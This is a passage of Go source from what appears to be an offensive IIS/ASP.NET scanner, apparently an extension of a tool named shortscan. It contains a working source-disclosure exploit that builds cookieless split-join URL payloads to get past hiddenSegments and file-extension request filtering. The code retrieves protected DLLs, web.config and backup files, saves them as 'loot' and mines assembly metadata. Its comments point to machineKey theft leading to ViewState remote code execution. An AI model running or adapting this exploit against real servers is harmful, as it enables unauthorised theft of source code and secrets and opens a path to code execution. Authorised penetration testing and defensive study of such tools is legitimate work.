			printHuman(color.HiRedString("source-probe: invalid URL %q", raw))
		}
		return false
	}
	base := u.Scheme + "://" + u.Host
	segs := pathSegments(u.EscapedPath())
	// Need EITHER a protected dir + filename (dir-split → hiddenSegments), or at
	// least a filename with an extension to split (ext-split → fileExtension
	// filtering, e.g. a request-filter-denied /backup.zip at the web root).
	if len(segs) == 0 || (len(segs) < 2 && strings.LastIndexByte(segs[len(segs)-1], '.') <= 0) {
		if !quiet {
			printHuman(color.HiRedString("source-probe: need /bin/App.dll (protected dir + filename) or a root file with a request-filter-denied extension (/backup.zip) — got %q", u.Path))
		}
		return false
	}
	file := segs[len(segs)-1]
	fileURL := base + u.EscapedPath()
	const bodyLimit = 262144 // 256 KiB is plenty to confirm disclosure without buffering whole DLLs

	// Shallow mode narrows the sweep to the canonical token only (the geometry that
	// actually re-forms under aggressive removal); it is used only as a cheap safety
	// net after the target already confirmed patched.
	tokens := sourceTokens
	if !deep {
		tokens = sourceTokens[:1]
	}

	// try splitting EACH directory segment (all but the final filename)
	type hit struct {
		payload, token string
		status         int
		bytes          int
		binary         bool
		via            string // "hiddenSegments" (dir-split) or "fileExtension filtering" (ext-split)
	}
	var hits []hit
	fakeFile := randAlnum(10) + extOf(file)

	for di := 0; di < len(segs)-1; di++ {
		dir := segs[di]
		if len(dir) < 2 {
			continue // cannot split a 1-char segment
		}
		pre := append([]string(nil), segs[:di]...)
		post := append([]string(nil), segs[di+1:]...)
		// Every split of the same folder re-forms the identical server-side path
		// (…/b/(T)in/ and …/bi/(T)n/ both → /bin/), so a few are enough: cap the
		// splits and stop this folder at its first confirmed hit to avoid flooding
		// long folders (App_GlobalResources = 17 splits) with redundant requests.
		splits := splitSegment(dir)
		if len(splits) > 3 {
			splits = splits[:3]
		}
		if !deep && len(splits) > 1 {
			splits = splits[:1] // shallow: canonical split only
		}
	dirLoop:
		for _, hv := range splits {
			for _, t := range tokens {
				p := buildSourcePayload(pre, hv[0], hv[1], post, t.tok)
				res, body, err := fetchBody(hc, st, "GET", base+p, bodyLimit)
				if err != nil || res == nil {
					continue
				}
				if res.StatusCode == http.StatusOK && len(body) > 0 {
					// control: same payload with a non-existent filename must NOT 200,
					// else the server answers 200 to everything (false positive).
					fpost := append([]string(nil), post...)
					fpost[len(fpost)-1] = fakeFile
					cp := buildSourcePayload(pre, hv[0], hv[1], fpost, t.tok)
					cres, _, _ := fetchBody(hc, st, "GET", base+cp, 1024)
					if cres != nil && cres.StatusCode == http.StatusOK {
						continue // resolves everything → not a real disclosure
					}
					hits = append(hits, hit{p, t.label, res.StatusCode, len(body), looksBinary(body), "hiddenSegments"})
					break dirLoop // one working split per folder is enough
				}
			}
		}
	}

	// Extension-split — a distinct primitive from the dir-split above. Split the
	// FINAL filename INSIDE its extension so the raw last segment carries no
	// request-filter-denied extension (…/backup.zi/(T)p → last raw segment "(T)p",
	// no ".zip"), then the cookieless collapse re-forms it (backup.zi+p = backup.zip).
	// This bypasses the fileExtensions request-filtering (not hiddenSegments): reads
	// web.config (→ machineKey → ViewState RCE), backups (.bak/.zip/.sql) and other
	// static-servable extensions an admin denied via request filtering. Same
	// aggressive-cookieless precondition as the dir-split.
	if dot := strings.LastIndexByte(file, '.'); dot >= 0 && dot < len(file)-1 {
		dirs := segs[:len(segs)-1]
		ext := file[dot:]
	extLoop:
		for k := dot + 2; k < len(file); k++ { // split strictly inside the extension
			for _, t := range tokens {
				p := buildSourcePayload(dirs, file[:k], file[k:], nil, t.tok)
				res, body, err := fetchBody(hc, st, "GET", base+p, bodyLimit)
				if err != nil || res == nil || res.StatusCode != http.StatusOK || len(body) == 0 {
					continue
				}
				// control: a non-existent filename split the same way must NOT 200.
				ff := randAlnum(10) + ext
				fk := len(ff) - (len(file) - k) // mirror the split offset from the end
				if fk < 1 || fk >= len(ff) {
					fk = len(ff) - 1
				}
				cp := buildSourcePayload(dirs, ff[:fk], ff[fk:], nil, t.tok)
				if cres, _, _ := fetchBody(hc, st, "GET", base+cp, 1024); cres != nil && cres.StatusCode == http.StatusOK {
					continue
				}
				hits = append(hits, hit{p, t.label, res.StatusCode, len(body), looksBinary(body), "fileExtension filtering"})
				break extLoop
			}
			if !deep {
				break // shallow: only the canonical split position
			}
		}
	}

	if len(hits) == 0 {
		// Silent under quiet (auto-chain): a non-disclosing probe prints nothing, so a
		// patched target never becomes a wall of "[not disclosed]" blocks. Only the
		// explicit --source-probe (quiet=false) frames the negative, as feedback the
		// operator deliberately asked for.
		if !quiet {
			baseCode := 0
			if res, err := fetch(hc, st, "GET", fileURL); err == nil {
				baseCode = res.StatusCode
			}
			sourceProbeHeader(fileURL)
			printHuman("    " + color.HiBlackString("direct GET ") + colorStatus(baseCode) +
				color.HiBlackString(" (request-filter blocked) — trying cookieless split-join"))
			printHuman("    " + color.HiBlackString("[not disclosed] no cookieless split-join served the file — patched default (aggressive removal off), or cookieless/runAllManaged not enabled, or wrong reconstructed name"))
		}
		return false
	}
	// Disclosed — always frame the critical section (this is the whole point of the
	// probe, so it prints in quiet mode too). report the strongest hit first (binary/PE beats text)
	best := hits[0]
	for _, h := range hits {
		if h.binary && !best.binary {
			best = h
		}
	}
	kind := "file bytes"
	if best.binary {
		kind = "BINARY/PE (DLL) bytes"
	}
	sourceProbeHeader(fileURL)
	printHuman("    " + color.HiRedString("[SOURCE-DISCLOSURE/critical] %s served %d %s past %s via %s cookieless split-join",
		file, best.bytes, kind, best.via, best.token))
	printHuman("    " + color.HiRedString("    working URL: %s", base+best.payload))
	// save the loot: fetch the full body (up to 16 MiB) and write it under the loot dir.
	saved, path, full := saveDisclosedFile(hc, st, base+best.payload, file)
	if saved {
		printHuman("    " + color.HiGreenString("    saved -> %s", path))
	} else if path != "" {
		printHuman("    " + color.HiBlackString("    %s", path))
	}
	emitAssemblyMetadata(full)
	printHuman("    " + color.HiBlackString("    implies aggressive cookieless removal (unpatched, or RestoreAggressiveCookielessPathRemoval=true) + runAllManagedModulesForAllRequests=true for static targets"))
	for _, h := range hits {
		if h.payload == best.payload {
			continue
		}
		printHuman("    " + color.HiBlackString("    also: %s (%d bytes, %s)", base+h.payload, h.bytes, h.token))
	}
	return true
}

// lootPath returns an organised, host-namespaced destination for disclosed loot:
// <LootDir>/<host_port>/<filename>. It keeps a real scan's DLLs out of the cwd and
// groups them by target so they never collide across hosts. (The protected folder is
// not recoverable from the cookieless-split URL client-side, so host is the key.)
func lootPath(rawURL, name string) string {
	dir := args.LootDir
	if dir == "" {
		dir = "shortscan-loot"
	}
	host := "host"
	if u, err := nurl.Parse(rawURL); err == nil && u.Host != "" {
		host = sanitizePathSeg(u.Host) // includes :port -> replaced
	}
	safe := sanitizePathSeg(filepath.Base(strings.ReplaceAll(name, "\\", "/")))
	if safe == "" || safe == "." || safe == ".." {
		safe = "disclosed.bin"
	}
	return filepath.Join(dir, host, safe)
}

// sanitizePathSeg strips path separators / dangerous chars so a reconstructed
// server-side name can never escape the loot directory.
func sanitizePathSeg(s string) string {
	s = strings.Map(func(r rune) rune {
		switch r {
		case '/', '\\', ':', '*', '?', '"', '<', '>', '|', 0:
			return '_'
		}
		return r
	}, s)
	return strings.TrimLeft(s, ".") // no leading dots -> no ".."/hidden traversal
}

// saveDisclosedFile downloads the full disclosed body, writes it under the organised
// loot directory (skipping if the file already exists, so re-runs don't clobber earlier
// loot), and returns the bytes for metadata mining.
func saveDisclosedFile(hc *http.Client, st *httpStats, url, name string) (bool, string, []byte) {
	const maxLoot = 16 << 20 // 16 MiB cap
	res, body, err := fetchBody(hc, st, "GET", url, maxLoot+1)
	if err != nil || len(body) == 0 {
		return false, "", nil
	}
	if (res != nil && res.ContentLength > maxLoot) || len(body) > maxLoot {
		if len(body) > maxLoot {
			body = body[:maxLoot]
		}
		return false, fmt.Sprintf("not saved: response exceeds %s safety limit", formatBytes(maxLoot)), body
	}
	dest := lootPath(url, name)
	if _, err := os.Stat(dest); err == nil {
		return false, dest + " (exists, not overwritten)", body
	}
	if err := os.MkdirAll(filepath.Dir(dest), 0o700); err != nil {
		log.WithFields(log.Fields{"err": err, "dir": filepath.Dir(dest)}).Debug("could not create loot dir")
		return false, "", body
	}
	if err := os.WriteFile(dest, body, 0o600); err != nil {
		log.WithFields(log.Fields{"err": err, "file": dest}).Debug("could not save disclosed file")
		return false, "", body
	}
	return true, dest, body
}

// emitAssemblyMetadata mines a disclosed .NET assembly for source names / build path /
// SourceLink — long names the 8.3 oracle can never reach — and prints them.
func emitAssemblyMetadata(body []byte) {
	for _, line := range inspectAssemblyBytes(body).summary() {
		printHuman("    " + color.HiYellowString("    ↳ recovered: %s", line))
	}
}

// extOf returns the extension including the dot, or "" if none.
func extOf(name string) string {
	if i := strings.LastIndex(name, "."); i >= 0 {
		return name[i:]
	}
	return ""
}
